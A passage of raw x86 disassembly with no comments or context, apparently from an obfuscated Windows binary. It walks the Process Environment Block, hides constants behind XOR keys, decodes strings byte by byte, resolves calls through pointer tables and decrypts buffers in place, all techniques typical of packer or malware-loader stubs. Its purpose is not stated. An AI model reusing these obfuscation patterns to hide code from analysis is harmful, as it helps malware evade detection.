  42549d:	mov    DWORD PTR [ebp-0x2c],ecx
  4254a0:	mov    DWORD PTR [ebp-0x24],0x256
  4254a7:	mov    DWORD PTR [ebp-0x34],0x34
  4254ae:	mov    DWORD PTR [ebp-0x10],0x78
  4254b5:	lea    edi,[ebp-0xe4]
  4254bb:	lea    esi,[ebp-0x104]
  4254c1:	call   0x4260db
  4254c6:	dec    DWORD PTR [ebp-0x10]
  4254c9:	jne    0x4254b5
  4254cb:	dec    DWORD PTR [ebp-0x34]
  4254ce:	jne    0x4254ae
  4254d0:	dec    DWORD PTR [ebp-0x24]
  4254d3:	jne    0x4254a7
  4254d5:	mov    DWORD PTR [ebp-0x24],0x400c
  4254dc:	mov    eax,DWORD PTR [ebp-0x14]
  4254df:	xor    eax,ebx
  4254e1:	mov    esi,0x3272e0
  4254e6:	add    eax,esi
  4254e8:	mov    DWORD PTR [ebp-0x8],eax
  4254eb:	mov    eax,DWORD PTR [ebp-0x14]
  4254ee:	and    DWORD PTR [ebp-0x94],0x0
  4254f5:	xor    eax,ebx
  4254f7:	add    eax,esi
  4254f9:	mov    DWORD PTR [ebp-0x38],eax
  4254fc:	mov    eax,fs:0x18
  425502:	mov    DWORD PTR [ebp-0x94],eax
  425508:	mov    eax,DWORD PTR [eax+0x30]
  42550b:	mov    DWORD PTR [ebp-0x98],eax
  425511:	mov    eax,DWORD PTR [eax+0xc]
  425514:	mov    DWORD PTR [ebp-0xc0],eax
  42551a:	mov    eax,DWORD PTR [ebp+0x8]
  42551d:	lea    ecx,[ebp-0x94]
  425523:	mov    DWORD PTR [eax+0x1a0],ecx
  425529:	mov    eax,DWORD PTR [ebp+0x8]
  42552c:	lea    ecx,[ebp-0x98]
  425532:	mov    DWORD PTR [eax+0x1a4],ecx
  425538:	mov    eax,DWORD PTR [ebp+0x8]
  42553b:	push   DWORD PTR [ebp+0x8]
  42553e:	lea    ecx,[ebp-0xc0]
  425544:	mov    DWORD PTR [eax+0x1a8],ecx
  42554a:	call   0x427899
  42554f:	mov    ecx,DWORD PTR [ebp-0x14]
  425552:	xor    ecx,ebx
  425554:	add    ecx,esi
  425556:	cmp    ecx,eax
  425558:	je     0x425835
  42555e:	mov    eax,DWORD PTR [ebp+0x8]
  425561:	mov    eax,DWORD PTR [eax+0x194]
  425567:	mov    ecx,DWORD PTR [eax]
  425569:	mov    eax,DWORD PTR [ebp+0x8]
  42556c:	mov    eax,DWORD PTR [eax+0x194]
  425572:	mov    eax,DWORD PTR [eax]
  425574:	add    eax,DWORD PTR [ecx+0x3c]
  425577:	mov    ecx,DWORD PTR [ebp+0x8]
  42557a:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425580:	lea    edx,[ebp-0xc4]
  425586:	push   edx
  425587:	mov    edx,DWORD PTR [ebp+0x8]
  42558a:	mov    edx,DWORD PTR [edx+0x18c]
  425590:	mov    edx,DWORD PTR [edx]
  425592:	add    edx,DWORD PTR [eax+0x88]
  425598:	push   0x4
  42559a:	push   DWORD PTR [eax+0x8c]
  4255a0:	push   edx
  4255a1:	call   DWORD PTR [ecx+0x1c]
  4255a4:	push   DWORD PTR [ebp+0x8]
  4255a7:	mov    edi,DWORD PTR [ebp+0x8]
  4255aa:	mov    eax,DWORD PTR [ebp+0x8]
  4255ad:	mov    edx,DWORD PTR [eax+0x1b8]
  4255b3:	mov    DWORD PTR [ebp-0x68],0x80e0f06
  4255ba:	mov    DWORD PTR [ebp-0x64],0x10a051f
  4255c1:	mov    WORD PTR [ebp-0x60],0x7a39
  4255c7:	mov    DWORD PTR [ebp-0x90],0x23f0f21
  4255d1:	mov    DWORD PTR [ebp-0x8c],0x6390819
  4255db:	mov    DWORD PTR [ebp-0x88],0x2419020a
  4255e5:	mov    DWORD PTR [ebp-0x84],0x81d050d
  4255ef:	mov    DWORD PTR [ebp-0x80],0x7a391f01
  4255f6:	mov    DWORD PTR [ebp-0x7c],0x23f0f21
  4255fd:	mov    DWORD PTR [ebp-0x78],0x6390819
  425604:	mov    DWORD PTR [ebp-0x74],0x2419020a
  42560b:	mov    DWORD PTR [ebp-0x70],0x81d050d
  425612:	mov    DWORD PTR [ebp-0x6c],0x7a131f01
  425619:	call   0x4278c8
  42561e:	push   eax
  42561f:	mov    eax,DWORD PTR [ebp+0x8]
  425622:	mov    eax,DWORD PTR [eax+0x1a8]
  425628:	push   DWORD PTR [eax]
  42562a:	call   0x42756a
  42562f:	test   eax,eax
  425631:	jne    0x425683
  425633:	mov    eax,DWORD PTR [ebp+0x8]
  425636:	mov    eax,DWORD PTR [eax+0x1d8]
  42563c:	mov    edi,DWORD PTR [ebp+0x8]
  42563f:	add    eax,0x4
  425642:	mov    DWORD PTR [ebp-0x20],eax
  425645:	mov    eax,DWORD PTR [ebp+0x8]
  425648:	mov    edx,DWORD PTR [eax+0x1b8]
  42564e:	call   0x4278c8
  425653:	push   eax
  425654:	mov    eax,DWORD PTR [ebp-0x20]
  425657:	call   DWORD PTR [eax]
  425659:	test   eax,eax
  42565b:	jne    0x425683
  42565d:	mov    eax,DWORD PTR [ebp+0x8]
  425660:	mov    eax,DWORD PTR [eax+0x1d8]
  425666:	mov    edi,DWORD PTR [ebp+0x8]
  425669:	add    eax,0x10
  42566c:	mov    DWORD PTR [ebp-0x20],eax
  42566f:	mov    eax,DWORD PTR [ebp+0x8]
  425672:	mov    edx,DWORD PTR [eax+0x1b8]
  425678:	call   0x4278c8
  42567d:	push   eax
  42567e:	mov    eax,DWORD PTR [ebp-0x20]
  425681:	call   DWORD PTR [eax]
  425683:	mov    eax,DWORD PTR [ebp-0x14]
  425686:	mov    ecx,DWORD PTR [ebp-0x24]
  425689:	xor    eax,ebx
  42568b:	add    eax,esi
  42568d:	cmp    eax,ecx
  42568f:	je     0x42580e
  425695:	mov    eax,DWORD PTR [ebp-0x18]
  425698:	xor    eax,ebx
  42569a:	mov    ecx,0xffcd8d20
  42569f:	sub    ecx,eax
  4256a1:	add    ecx,DWORD PTR [ebp-0x24]
  4256a4:	mov    eax,DWORD PTR [ebp-0x8]
  4256a7:	cmp    eax,ecx
  4256a9:	ja     0x42580e
  4256af:	mov    DWORD PTR [ebp-0x34],0x0
  4256b6:	push   DWORD PTR [ebp+0x8]
  4256b9:	mov    edi,DWORD PTR [ebp+0x8]
  4256bc:	mov    eax,DWORD PTR [ebp+0x8]
  4256bf:	mov    edx,DWORD PTR [eax+0x1b4]
  4256c5:	call   0x4278c8
  4256ca:	push   eax
  4256cb:	mov    eax,DWORD PTR [ebp+0x8]
  4256ce:	mov    eax,DWORD PTR [eax+0x1a8]
  4256d4:	push   DWORD PTR [eax]
  4256d6:	call   0x42756a
  4256db:	mov    ecx,DWORD PTR [ebp+0x8]
  4256de:	mov    ecx,DWORD PTR [ecx+0x19c]
  4256e4:	mov    DWORD PTR [ecx],eax
  4256e6:	mov    eax,DWORD PTR [ebp+0x8]
  4256e9:	mov    edi,DWORD PTR [eax+0x1d8]
  4256ef:	mov    esi,DWORD PTR [ebp+0x8]
  4256f2:	xor    eax,eax
  4256f4:	lea    edx,[ebp-0x7c]
  4256f7:	call   0x4278fe
  4256fc:	push   eax
  4256fd:	mov    eax,DWORD PTR [ebp+0x8]
  425700:	mov    eax,DWORD PTR [eax+0x19c]
  425706:	push   DWORD PTR [eax]
  425708:	call   DWORD PTR [edi+0x8]
  42570b:	mov    DWORD PTR [ebp-0x20],eax
  42570e:	mov    eax,DWORD PTR [ebp+0x8]
  425711:	mov    edi,DWORD PTR [eax+0x1d8]
  425717:	mov    esi,DWORD PTR [ebp+0x8]
  42571a:	xor    eax,eax
  42571c:	lea    edx,[ebp-0x90]
  425722:	call   0x4278fe
  425727:	push   eax
  425728:	mov    eax,DWORD PTR [ebp+0x8]
  42572b:	mov    eax,DWORD PTR [eax+0x19c]
  425731:	push   DWORD PTR [eax]
  425733:	call   DWORD PTR [edi+0x8]
  425736:	and    DWORD PTR [ebp-0x1c],0x0
  42573a:	mov    eax,DWORD PTR [ebp-0x1c]
  42573d:	and    eax,0x7
  425740:	add    eax,0x31
  425743:	push   eax
  425744:	call   DWORD PTR [ebp-0x20]
  425747:	test   eax,eax
  425749:	jne    0x425750
  42574b:	and    DWORD PTR [ebp-0x10],eax
  42574e:	jmp    0x425778
  425750:	mov    eax,DWORD PTR [ebp+0x8]
  425753:	mov    edi,DWORD PTR [eax+0x1d8]
  425759:	mov    esi,DWORD PTR [ebp+0x8]
  42575c:	xor    eax,eax
  42575e:	lea    edx,[ebp-0x68]
  425761:	call   0x4278fe
  425766:	push   eax
  425767:	mov    eax,DWORD PTR [ebp+0x8]
  42576a:	mov    eax,DWORD PTR [eax+0x198]
  425770:	push   DWORD PTR [eax]
  425772:	call   DWORD PTR [edi+0x8]
  425775:	mov    DWORD PTR [ebp-0x10],eax
  425778:	inc    DWORD PTR [ebp-0x1c]
  42577b:	cmp    DWORD PTR [ebp-0x1c],0x10
  42577f:	jb     0x42573a
  425781:	mov    eax,DWORD PTR [ebp-0x18]
  425784:	mov    esi,DWORD PTR [ebp+0x8]
  425787:	xor    eax,ebx
  425789:	mov    edi,0x3272e0
  42578e:	add    eax,edi
  425790:	lea    edx,[ebp-0xe4]
  425796:	call   0x4278fe
  42579b:	push   eax
  42579c:	mov    eax,DWORD PTR [ebp-0x14]
  42579f:	mov    esi,DWORD PTR [ebp+0x8]
  4257a2:	xor    eax,ebx
  4257a4:	add    eax,edi
  4257a6:	lea    edx,[ebp-0x104]
  4257ac:	call   0x4278fe
  4257b1:	push   eax
  4257b2:	call   DWORD PTR [ebp-0x10]
  4257b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4257b8:	xor    ecx,ebx
  4257ba:	add    ecx,edi
  4257bc:	cmp    ecx,eax
  4257be:	jne    0x4257c7
  4257c0:	mov    DWORD PTR [ebp-0x34],0x1
  4257c7:	mov    eax,DWORD PTR [ebp-0x18]
  4257ca:	mov    ecx,DWORD PTR [ebp-0x8]
  4257cd:	xor    eax,ebx
  4257cf:	lea    eax,[eax+ecx*1+0x3272e0]
  4257d6:	mov    DWORD PTR [ebp-0x8],eax
  4257d9:	mov    eax,DWORD PTR [ebp-0x34]
  4257dc:	test   eax,eax
  4257de:	je     0x4257f2
  4257e0:	mov    eax,DWORD PTR [ebp-0x18]
  4257e3:	mov    ecx,DWORD PTR [ebp-0x38]
  4257e6:	xor    eax,ebx
  4257e8:	lea    eax,[eax+ecx*1+0x3272e0]
  4257ef:	mov    DWORD PTR [ebp-0x38],eax
  4257f2:	mov    eax,DWORD PTR [ebp-0x18]
  4257f5:	xor    eax,ebx
  4257f7:	mov    ecx,0xffcd8d20
  4257fc:	sub    ecx,eax
  4257fe:	add    ecx,DWORD PTR [ebp-0x24]
  425801:	mov    eax,DWORD PTR [ebp-0x8]
  425804:	cmp    eax,ecx
  425806:	jbe    0x4256af
  42580c:	mov    esi,edi
  42580e:	mov    eax,DWORD PTR [ebp-0x38]
  425811:	mov    ecx,DWORD PTR [ebp-0x8]
  425814:	cmp    ecx,eax
  425816:	jne    0x425829
  425818:	push   DWORD PTR [ebp+0x8]
  42581b:	lea    eax,[ebp-0x40]
  42581e:	push   eax
  42581f:	call   0x428377
  425824:	mov    DWORD PTR [ebp-0x28],eax
  425827:	jmp    0x425835
  425829:	mov    eax,DWORD PTR [ebp-0x28]
  42582c:	mov    ecx,DWORD PTR [ebp-0x18]
  42582f:	xor    ecx,ebx
  425831:	add    ecx,esi
  425833:	xor    DWORD PTR [eax],ecx
  425835:	mov    eax,DWORD PTR [ebp-0x14]
  425838:	mov    ecx,DWORD PTR [ebp-0x28]
  42583b:	xor    eax,ebx
  42583d:	add    eax,esi
  42583f:	cmp    eax,ecx
  425841:	je     0x425fb9
  425847:	mov    eax,DWORD PTR [ebp-0x14]
  42584a:	mov    ecx,DWORD PTR [ebp-0x40]
  42584d:	xor    eax,ebx
  42584f:	add    eax,esi
  425851:	cmp    eax,ecx
  425853:	je     0x425fb9
  425859:	mov    eax,DWORD PTR [ebp-0x14]
  42585c:	xor    eax,ebx
  42585e:	add    eax,esi
  425860:	jmp    0x42587e
  425862:	mov    edi,DWORD PTR [ebp-0x28]
  425865:	mov    cl,al
  425867:	and    cl,0x1f
  42586a:	or     dl,0xff
  42586d:	sub    dl,cl
  42586f:	add    BYTE PTR [edi+eax*1],dl
  425872:	mov    ecx,DWORD PTR [ebp-0x18]
  425875:	xor    ecx,ebx
  425877:	lea    eax,[eax+ecx*1+0x3272e0]
  42587e:	mov    ecx,DWORD PTR [ebp-0x40]
  425881:	cmp    eax,ecx
  425883:	jb     0x425862
  425885:	mov    eax,DWORD PTR [ebp-0x40]
  425888:	mov    DWORD PTR [ebp-0x24],eax
  42588b:	mov    eax,DWORD PTR [ebp-0x28]
  42588e:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  425895:	mov    DWORD PTR [ebp-0xbc],eax
  42589b:	mov    edi,0xf89c85b8
  4258a0:	mov    DWORD PTR [ebp-0x30],edi
  4258a3:	mov    eax,DWORD PTR [ebp-0x38]
  4258a6:	xor    eax,ebx
  4258a8:	add    eax,esi
  4258aa:	mov    DWORD PTR [ebp-0xc],eax
  4258ad:	mov    eax,DWORD PTR [ebp-0x38]
  4258b0:	xor    eax,ebx
  4258b2:	add    eax,esi
  4258b4:	mov    DWORD PTR [ebp-0x8],eax
  4258b7:	mov    DWORD PTR [ebp-0x48],0xf89c85d9
  4258be:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  4258c5:	mov    eax,DWORD PTR [ebp-0x38]
  4258c8:	mov    ecx,DWORD PTR [ebp-0x24]
  4258cb:	xor    eax,ebx
  4258cd:	add    eax,esi
  4258cf:	cmp    ecx,eax
  4258d1:	je     0x425ad0
  4258d7:	jmp    0x425aac
  4258dc:	mov    ecx,DWORD PTR [ebp-0xc]
  4258df:	mov    eax,DWORD PTR [ebp-0x24]
  4258e2:	sub    eax,ecx
  4258e4:	mov    ecx,DWORD PTR [ebp-0x48]
  4258e7:	xor    ecx,ebx
  4258e9:	add    ecx,esi
  4258eb:	xor    edx,edx
  4258ed:	div    ecx
  4258ef:	mov    DWORD PTR [ebp-0x8],eax
  4258f2:	mov    eax,DWORD PTR [ebp-0x54]
  4258f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4258f8:	xor    eax,ebx
  4258fa:	add    eax,esi
  4258fc:	cmp    ecx,eax
  4258fe:	jbe    0x42590a
  425900:	mov    eax,DWORD PTR [ebp-0x54]
  425903:	xor    eax,ebx
  425905:	add    eax,esi
  425907:	mov    DWORD PTR [ebp-0x8],eax
  42590a:	mov    eax,DWORD PTR [ebp-0x48]
  42590d:	mov    ecx,DWORD PTR [ebp-0x8]
  425910:	xor    eax,ebx
  425912:	add    eax,esi
  425914:	imul   eax,ecx
  425917:	mov    DWORD PTR [ebp-0x8],eax
  42591a:	mov    eax,DWORD PTR [ebp-0x38]
  42591d:	mov    ecx,DWORD PTR [ebp-0x8]
  425920:	xor    eax,ebx
  425922:	add    eax,esi
  425924:	cmp    ecx,eax
  425926:	je     0x425a9a
  42592c:	mov    eax,DWORD PTR [ebp-0x8]
  42592f:	mov    DWORD PTR [ebp-0x10],eax
  425932:	mov    eax,DWORD PTR [ebp-0xc]
  425935:	add    eax,DWORD PTR [ebp-0xbc]
  42593b:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  425942:	mov    DWORD PTR [ebp-0x34],edi
  425945:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  42594f:	mov    DWORD PTR [ebp-0x8],eax
  425952:	mov    DWORD PTR [ebp-0x2c],0xf89c85ba
  425959:	mov    DWORD PTR [ebp-0x1c],edi
  42595c:	mov    eax,DWORD PTR [ebp-0x20]
  42595f:	xor    eax,ebx
  425961:	add    eax,esi
  425963:	jmp    0x425a59
  425968:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  425972:	mov    DWORD PTR [ebp-0xb8],0xf89c85ad
  42597c:	mov    eax,DWORD PTR [ebp-0x1c]
  42597f:	mov    ecx,DWORD PTR [ebp-0x44]
  425982:	xor    eax,ebx
  425984:	add    eax,esi
  425986:	imul   eax,ecx
  425989:	mov    ecx,DWORD PTR [ebp-0x8]
  42598c:	mov    al,BYTE PTR [eax+ecx*1]
  42598f:	mov    BYTE PTR [ebp-0x2],al
  425992:	mov    eax,DWORD PTR [ebp-0x1c]
  425995:	mov    ecx,DWORD PTR [ebp-0x44]
  425998:	xor    eax,ebx
  42599a:	add    eax,esi
  42599c:	imul   eax,ecx
  42599f:	mov    ecx,DWORD PTR [ebp-0xa8]
  4259a5:	xor    ecx,ebx
  4259a7:	add    eax,ecx
  4259a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4259ac:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  4259b4:	mov    ecx,DWORD PTR [ebp-0xb0]
  4259ba:	xor    ecx,ebx
  4259bc:	lea    eax,[ecx+eax*1+0x3272e0]
  4259c3:	movzx  ecx,BYTE PTR [ebp-0x2]
  4259c7:	xor    ecx,eax
  4259c9:	mov    BYTE PTR [ebp-0x2],cl
  4259cc:	mov    al,BYTE PTR [ebp-0x2]
  4259cf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4259d2:	mov    edx,DWORD PTR [ebp-0x44]
  4259d5:	xor    ecx,ebx
  4259d7:	add    ecx,esi
  4259d9:	imul   ecx,edx
  4259dc:	mov    edx,DWORD PTR [ebp-0x8]
  4259df:	mov    BYTE PTR [ecx+edx*1],al
  4259e2:	mov    eax,DWORD PTR [ebp-0x1c]
  4259e5:	mov    ecx,DWORD PTR [ebp-0x44]
  4259e8:	xor    eax,ebx
  4259ea:	add    eax,esi
  4259ec:	imul   eax,ecx
  4259ef:	mov    ecx,DWORD PTR [ebp-0x8]
  4259f2:	mov    al,BYTE PTR [eax+ecx*1]
  4259f5:	mov    BYTE PTR [ebp-0x2],al
  4259f8:	mov    eax,DWORD PTR [ebp-0x1c]
  4259fb:	mov    ecx,DWORD PTR [ebp-0x44]
  4259fe:	xor    eax,ebx
  425a00:	add    eax,esi
  425a02:	imul   eax,ecx
  425a05:	mov    ecx,DWORD PTR [ebp-0x34]
  425a08:	xor    ecx,ebx
  425a0a:	add    eax,ecx
  425a0c:	mov    ecx,DWORD PTR [ebp-0x8]
  425a0f:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  425a17:	mov    ecx,DWORD PTR [ebp-0xb8]
  425a1d:	xor    ecx,ebx
  425a1f:	lea    eax,[ecx+eax*1+0x3272e0]
  425a26:	movzx  ecx,BYTE PTR [ebp-0x2]
  425a2a:	xor    ecx,eax
  425a2c:	mov    BYTE PTR [ebp-0x2],cl
  425a2f:	mov    al,BYTE PTR [ebp-0x2]
  425a32:	mov    ecx,DWORD PTR [ebp-0x1c]
  425a35:	mov    edx,DWORD PTR [ebp-0x44]
  425a38:	xor    ecx,ebx
  425a3a:	add    ecx,esi
  425a3c:	imul   ecx,edx
  425a3f:	mov    edx,DWORD PTR [ebp-0x8]
  425a42:	mov    BYTE PTR [ecx+edx*1],al
  425a45:	mov    eax,DWORD PTR [ebp-0x2c]
  425a48:	mov    ecx,DWORD PTR [ebp-0x34]
  425a4b:	xor    eax,ebx
  425a4d:	xor    ecx,ebx
  425a4f:	add    eax,esi
  425a51:	add    ecx,esi
  425a53:	imul   eax,ecx
  425a56:	add    eax,DWORD PTR [ebp-0x44]
  425a59:	mov    DWORD PTR [ebp-0x44],eax
  425a5c:	mov    eax,DWORD PTR [ebp-0x44]
  425a5f:	mov    ecx,DWORD PTR [ebp-0x10]
  425a62:	cmp    ecx,eax
  425a64:	jb     0x425968
  425a6a:	mov    eax,DWORD PTR [ebp-0x34]
  425a6d:	mov    ecx,DWORD PTR [ebp-0x10]
  425a70:	xor    eax,ebx
  425a72:	add    eax,esi
  425a74:	imul   eax,ecx
  425a77:	mov    ecx,DWORD PTR [ebp-0x20]
  425a7a:	xor    ecx,ebx
  425a7c:	add    ecx,esi
  425a7e:	or     eax,ecx
  425a80:	mov    ecx,DWORD PTR [ebp-0x30]
  425a83:	xor    ecx,ebx
  425a85:	add    eax,ecx
  425a87:	mov    ecx,DWORD PTR [ebp-0x30]
  425a8a:	xor    ecx,ebx
  425a8c:	add    eax,ecx
  425a8e:	mov    ecx,DWORD PTR [ebp-0xc]
  425a91:	lea    eax,[eax+ecx*1+0x64e5c0]
  425a98:	jmp    0x425aa9
  425a9a:	mov    eax,DWORD PTR [ebp-0x30]
  425a9d:	mov    ecx,DWORD PTR [ebp-0xc]
  425aa0:	xor    eax,ebx
  425aa2:	lea    eax,[eax+ecx*1+0x3272e0]
  425aa9:	mov    DWORD PTR [ebp-0xc],eax
  425aac:	mov    eax,DWORD PTR [ebp-0x30]
  425aaf:	xor    eax,ebx
  425ab1:	mov    ecx,0xffcd8d20
  425ab6:	sub    ecx,eax
  425ab8:	add    ecx,DWORD PTR [ebp-0x24]
  425abb:	mov    eax,DWORD PTR [ebp-0x30]
  425abe:	mov    edx,DWORD PTR [ebp-0xc]
  425ac1:	xor    eax,ebx
  425ac3:	add    eax,esi
  425ac5:	imul   eax,edx
  425ac8:	cmp    eax,ecx
  425aca:	jbe    0x4258dc
  425ad0:	mov    eax,DWORD PTR [ebp-0x14]
  425ad3:	mov    ecx,DWORD PTR [ebp-0x40]
  425ad6:	mov    eax,DWORD PTR [ebp+0x8]
  425ad9:	mov    edx,DWORD PTR [ebp-0x4c]
  425adc:	mov    eax,DWORD PTR [eax+0x1d8]
  425ae2:	xor    edx,ebx
  425ae4:	add    edx,esi
  425ae6:	push   edx
  425ae7:	mov    edx,DWORD PTR [ebp-0x3c]
  425aea:	xor    edx,ebx
  425aec:	add    edx,esi
  425aee:	push   edx
  425aef:	push   ecx
  425af0:	mov    DWORD PTR [ebp-0x2c],ecx
  425af3:	mov    ecx,DWORD PTR [ebp-0x14]
  425af6:	xor    ecx,ebx
  425af8:	add    ecx,esi
  425afa:	push   ecx
  425afb:	call   DWORD PTR [eax+0x14]
  425afe:	mov    edi,eax
  425b00:	mov    eax,DWORD PTR [ebp-0x14]
  425b03:	xor    eax,ebx
  425b05:	add    eax,esi
  425b07:	cmp    eax,edi
  425b09:	je     0x425b64
  425b0b:	mov    eax,DWORD PTR [ebp-0x14]
  425b0e:	jmp    0x425b31
  425b10:	mov    ecx,DWORD PTR [ebp-0x28]
  425b13:	xor    eax,ebx
  425b15:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e0]
  425b1c:	mov    BYTE PTR [eax+edi*1+0x3272e0],cl
  425b23:	mov    ecx,DWORD PTR [ebp-0x18]
  425b26:	xor    ecx,ebx
  425b28:	lea    eax,[ecx+eax*1+0x3272e0]
  425b2f:	xor    eax,ebx
  425b31:	mov    ecx,DWORD PTR [ebp-0x40]
  425b34:	sub    ecx,esi
  425b36:	xor    ecx,ebx
  425b38:	cmp    eax,ecx
  425b3a:	jne    0x425b10
  425b3c:	mov    eax,DWORD PTR [ebp+0x8]
  425b3f:	mov    ecx,DWORD PTR [ebp-0x50]
  425b42:	mov    eax,DWORD PTR [eax+0x1d8]
  425b48:	xor    ecx,ebx
  425b4a:	add    ecx,esi
  425b4c:	push   ecx
  425b4d:	mov    ecx,DWORD PTR [ebp-0x14]
  425b50:	xor    ecx,ebx
  425b52:	add    ecx,esi
  425b54:	push   ecx
  425b55:	push   DWORD PTR [ebp-0x28]
  425b58:	call   DWORD PTR [eax+0x18]
  425b5b:	mov    eax,DWORD PTR [ebp-0x2c]
  425b5e:	mov    DWORD PTR [ebp-0x28],edi
  425b61:	mov    DWORD PTR [ebp-0x40],eax
  425b64:	mov    edi,DWORD PTR [ebp-0x28]
  425b67:	mov    eax,DWORD PTR [ebp-0x18]
  425b6a:	mov    ecx,DWORD PTR [ebp-0x14]
  425b6d:	xor    eax,ebx
  425b6f:	mov    DWORD PTR [ebp-0x2c],edi
  425b72:	add    eax,esi
  425b74:	mov    DWORD PTR [ebp-0x5c],0x39122a12
  425b7b:	mov    DWORD PTR [ebp-0x58],0x27123f12
  425b82:	jmp    0x425bb6
  425b84:	xor    ecx,ebx
  425b86:	mov    dl,BYTE PTR [ebp+ecx*1+0x327284]
  425b8d:	xor    dl,0x73
  425b90:	sub    dl,0x9
  425b93:	mov    DWORD PTR [ebp-0x3c],ecx
  425b96:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272e0]
  425b9e:	movzx  edx,dl
  425ba1:	cmp    ecx,edx
  425ba3:	jne    0x425bc0
  425ba5:	mov    ecx,DWORD PTR [ebp-0x18]
  425ba8:	mov    edx,DWORD PTR [ebp-0x3c]
  425bab:	xor    ecx,ebx
  425bad:	lea    ecx,[ecx+edx*1+0x3272e0]
  425bb4:	xor    ecx,ebx
  425bb6:	cmp    ecx,0xf89c85b1
  425bbc:	jne    0x425b84
  425bbe:	jmp    0x425bc7
  425bc0:	mov    eax,DWORD PTR [ebp-0x14]
  425bc3:	xor    eax,ebx
  425bc5:	add    eax,esi
  425bc7:	mov    ecx,DWORD PTR [ebp-0x14]
  425bca:	xor    ecx,ebx
  425bcc:	add    ecx,esi
  425bce:	cmp    ecx,eax
  425bd0:	je     0x425d43
  425bd6:	mov    eax,DWORD PTR [edi+0x8]
  425bd9:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  425be0:	mov    DWORD PTR [ebp-0x3c],0xf89cc316
  425be7:	mov    DWORD PTR [ebp-0x48],0xf89cb5b9
  425bee:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  425bf5:	mov    DWORD PTR [ebp-0x10],eax
  425bf8:	mov    eax,DWORD PTR [ebp+0x8]
  425bfb:	mov    ecx,DWORD PTR [ebp-0x20]
  425bfe:	xor    ecx,ebx
  425c00:	add    ecx,esi
  425c02:	push   ecx
  425c03:	mov    ecx,DWORD PTR [ebp-0x48]
  425c06:	mov    eax,DWORD PTR [eax+0x1d8]
  425c0c:	xor    ecx,ebx
  425c0e:	add    ecx,esi
  425c10:	push   ecx
  425c11:	mov    ecx,DWORD PTR [ebp-0x3c]
  425c14:	xor    ecx,ebx
  425c16:	add    ecx,esi
  425c18:	push   ecx
  425c19:	mov    ecx,DWORD PTR [ebp-0xc]
  425c1c:	xor    ecx,ebx
  425c1e:	add    ecx,esi
  425c20:	push   ecx
  425c21:	call   DWORD PTR [eax+0x14]
  425c24:	mov    edi,eax
  425c26:	mov    eax,DWORD PTR [ebp+0x8]
  425c29:	mov    ecx,DWORD PTR [ebp-0x20]
  425c2c:	mov    eax,DWORD PTR [eax+0x1d8]
  425c32:	xor    ecx,ebx
  425c34:	add    ecx,esi
  425c36:	push   ecx
  425c37:	mov    ecx,DWORD PTR [ebp-0x48]
  425c3a:	xor    ecx,ebx
  425c3c:	add    ecx,esi
  425c3e:	push   ecx
  425c3f:	mov    ecx,DWORD PTR [ebp-0xc]
  425c42:	push   DWORD PTR [ebp-0x10]
  425c45:	xor    ecx,ebx
  425c47:	add    ecx,esi
  425c49:	push   ecx
  425c4a:	call   DWORD PTR [eax+0x14]
  425c4d:	mov    ecx,DWORD PTR [ebp-0xc]
  425c50:	xor    ecx,ebx
  425c52:	add    ecx,esi
  425c54:	mov    DWORD PTR [ebp-0x20],eax
  425c57:	cmp    ecx,edi
  425c59:	je     0x425fe6
  425c5f:	mov    ecx,DWORD PTR [ebp-0xc]
  425c62:	xor    ecx,ebx
  425c64:	add    ecx,esi
  425c66:	cmp    ecx,eax
  425c68:	je     0x425fe6
  425c6e:	mov    DWORD PTR [ebp-0x3c],0xf89c85ba
  425c75:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  425c7c:	mov    ecx,DWORD PTR [ebp-0x3c]
  425c7f:	xor    cl,0x99
  425c82:	sub    cl,0x20
  425c85:	mov    BYTE PTR [edi],cl
  425c87:	mov    ecx,DWORD PTR [ebp-0xc]
  425c8a:	xor    cl,0x99
  425c8d:	sub    cl,0x20
  425c90:	mov    BYTE PTR [edi+0x1],cl
  425c93:	mov    ecx,DWORD PTR [ebp-0x4c]
  425c96:	xor    cl,0x99
  425c99:	sub    cl,0x20
  425c9c:	mov    BYTE PTR [edi+0x2],cl
  425c9f:	and    DWORD PTR [ebp-0xb4],0x0
  425ca6:	and    DWORD PTR [ebp-0xa4],0x0
  425cad:	lea    ecx,[ebp-0xa4]
  425cb3:	push   ecx
  425cb4:	push   DWORD PTR [ebp-0x10]
  425cb7:	push   eax
  425cb8:	lea    eax,[ebp-0xb4]
  425cbe:	push   eax
  425cbf:	mov    eax,DWORD PTR [ebp-0x2c]
  425cc2:	push   DWORD PTR [eax+0xc]
  425cc5:	mov    eax,DWORD PTR [ebp-0x28]
  425cc8:	add    eax,0x10
  425ccb:	push   eax
  425ccc:	push   edi
  425ccd:	call   0x425019
  425cd2:	mov    DWORD PTR [ebp-0x3c],eax
  425cd5:	mov    eax,DWORD PTR [ebp+0x8]
  425cd8:	mov    ecx,DWORD PTR [ebp-0x50]
  425cdb:	mov    eax,DWORD PTR [eax+0x1d8]
  425ce1:	xor    ecx,ebx
  425ce3:	add    ecx,esi
  425ce5:	push   ecx
  425ce6:	mov    ecx,DWORD PTR [ebp-0xc]
  425ce9:	xor    ecx,ebx
  425ceb:	add    ecx,esi
  425ced:	push   ecx
  425cee:	push   edi
  425cef:	call   DWORD PTR [eax+0x18]
  425cf2:	mov    eax,DWORD PTR [ebp-0x3c]
  425cf5:	add    eax,0xffcd8d20
  425cfa:	xor    eax,ebx
  425cfc:	cmp    eax,0xf89c85b9
  425d01:	mov    eax,DWORD PTR [ebp+0x8]
  425d04:	mov    eax,DWORD PTR [eax+0x1d8]
  425d0a:	mov    ecx,DWORD PTR [ebp-0x50]
  425d0d:	jne    0x425d30
  425d0f:	xor    ecx,ebx
